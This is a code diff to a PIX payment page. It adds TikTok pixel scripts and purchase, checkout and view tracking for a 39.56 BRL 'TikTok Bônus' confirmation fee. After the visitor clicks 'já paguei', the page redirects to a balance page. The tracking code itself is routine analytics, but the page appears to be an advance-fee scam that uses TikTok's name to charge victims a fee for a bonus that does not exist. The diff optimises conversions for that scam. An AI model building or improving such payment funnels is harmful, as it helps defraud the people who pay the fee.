@@ -9,6 +9,8 @@
   <link rel="icon" href="assets/icon.svg" type="image/svg+xml">
   <link rel="stylesheet" href="assets/_next/static/chunks/8a80e7184ad3a13f.css">
   <link rel="stylesheet" href="assets/_next/static/chunks/d53fa3d4da85ccbf.css">
+  <script src="assets/tiktok-pixel-config.js"></script>
+  <script src="assets/tiktok-pixel.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 </head>
 <body class="font-sans antialiased bg-[#F3F4F6]">
@@ -265,8 +267,18 @@
       var btnOk = document.getElementById('btn-ja-paguei');
       if (btnOk) {
         btnOk.addEventListener('click', function() {
+          if (typeof ttq !== 'undefined') {
+            var purchaseEventId = 'purchase_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
+            var purchaseParams = { value: 39.56, currency: 'BRL', content_id: 'taxa-confirmacao', content_type: 'product', content_name: 'Taxa de confirmação TikTok Bônus', event_id: purchaseEventId };
+            try { var ttclid = localStorage.getItem('ttclid'); if (ttclid) purchaseParams.ttclid = ttclid; } catch (_) {}
+            ttq.track('Purchase', purchaseParams);
+          }
           window.location.href = 'saldo.html';
         });
+      }
+      if (typeof ttq !== 'undefined') {
+        ttq.track('ViewContent', { content_id: 'pagamento-pix', content_name: 'Pagamento PIX', content_type: 'product', value: 39.56, currency: 'BRL' });
+        ttq.track('InitiateCheckout', { value: 39.56, currency: 'BRL', event_id: 'checkout_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9) });
       }
     })();
   </script>
